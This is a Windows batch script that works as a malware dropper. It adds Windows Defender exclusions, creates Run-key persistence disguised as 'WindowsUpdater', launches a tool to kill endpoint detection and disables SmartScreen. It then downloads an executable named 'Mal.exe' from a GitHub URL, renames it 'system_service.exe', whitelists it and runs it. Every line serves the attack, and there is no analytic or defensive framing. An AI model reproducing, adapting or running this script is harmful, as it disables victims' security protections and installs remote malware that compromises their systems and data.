@echo off
set "workDir=%~dp0"
cd /d "%workDir%"

:: 1. UNBLOCK & EXCLUSIONS
powershell -Command "Get-ChildItem -Path '%workDir%' -Recurse | Unblock-File" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%workDir%'" >nul 2>&1

:: 2. PERSISTENCE (Registry)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdater" /t REG_SZ /d "wscript.exe \"%workDir%launcher.vbs\"" /f >nul 2>&1

:: 3. THE KILLER (Sigurd)
taskkill /f /im sigurd.exe >nul 2>&1
if exist "sigurd.exe" (
    echo n | echo y | start /b "" "sigurd.exe" -s 1>nul 2>nul
)

:: 4. THE COOLDOWN (Wait for EDR to die)
timeout /t 20 /nobreak >nul

:: --- 4.5 KILL SMARTSCREEN (Registry & Process) ---
:: This tells Windows to effectively "ignore" SmartScreen errors
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "Off" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f >nul 2>&1

:: Force kill the process if Sigurd hasn't hit it yet
taskkill /f /im smartscreen.exe >nul 2>&1



:: --- 5. THE FINAL SEQUENCE ---

:: 1. MAKE SURE SIGURD IS RUNNING
:: This keeps the EDR dead while we work.
tasklist /FI "IMAGENAME eq sigurd.exe" | find /i "sigurd.exe" >nul
if %errorlevel% neq 0 (
    start /b "" "sigurd.exe" -s 1>nul 2>nul
)

:: 2. DOWNLOAD THE PAYLOAD
set "pUrl=https://github.com/g00glecenter101-arch/Loop/raw/refs/heads/main/Mal.exe"
set "pName=system_service.exe"

powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%pUrl%', '%pName%')"
powershell -Command "Unblock-File -Path '%pName%'"

:: 3. WHITELIST & RUN
:: Adding the exclusion ensures Sigurd and Windows stay away from it.
powershell -Command "Add-MpPreference -ExclusionProcess '%pName%'" >nul 2>&1
start /high "" "%pName%"

:: 4. EXIT AND WAIT
:: The payload is now in memory. Just wait your 3-5 minutes.
exit